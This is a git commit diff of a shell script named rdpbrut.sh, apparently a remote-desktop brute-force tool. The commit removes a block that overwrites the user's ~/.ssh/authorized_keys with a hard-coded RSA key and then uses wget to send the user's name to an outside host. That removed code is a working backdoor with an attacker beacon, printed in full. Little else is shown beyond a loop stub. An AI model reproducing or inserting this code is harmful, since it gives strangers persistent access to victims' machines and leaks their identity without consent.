25672714ad4a4161b62dca28a2981e46a695c0ac
pypcod <104689621+pypcod@users.noreply.github.com>
2023-05-07 11:49:47 +0300

    Update rdpbrut.sh

--- rdpbrut.sh
+++ rdpbrut.sh
@@ -1,16 +1,5 @@
 #!/bin/sh
-dir="$HOME/.ssh"
-  file="$dir/authorized_keys"
-  k="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpD3lm54lC6mCLUzG1XyJ79Ha0aPRtzU8HACTgZB2LIsk5mxcBTJ61p0Hl6H9/SthrOFWP8VpUzGzrEm8BZDbBPfMYHT08X07nk03MH1WCvzRSYV0saG4KRE/Dv+ucUwCc7iLZWqDIie3GNyK6lNY5bpOfZKwOp9vvWwJv4tMPnPS9EibF2hf63lNySm7WInnEMYY+QzobUm9BMB1ju1AeyeMmrpt1PsLgJdvrVoEnDG5XCUWPCKPFncUXAdmyx41GYyB4soEOvO2Zzmqtzyj6ZSFAkgWiNqZAKHbg7slQrTc5eJtBC2PH8x/eUdvpTmtj2WULpmhyMWp4AovZQA3p"
- if [ ! -d $dir ]; then
-  mkdir $dir
-  chmod 700 $dir
-  touch $file
-  chmod 600 $file
- fi
-  echo $k >  $file
-  wh=$(whoami)
-  wget -q http://wuyfyy.getenjoyment.net/i.php?w=$wh &> /dev/null
+
 while true
 do
 echo "Press [CTRL+C] to exit this loop..."
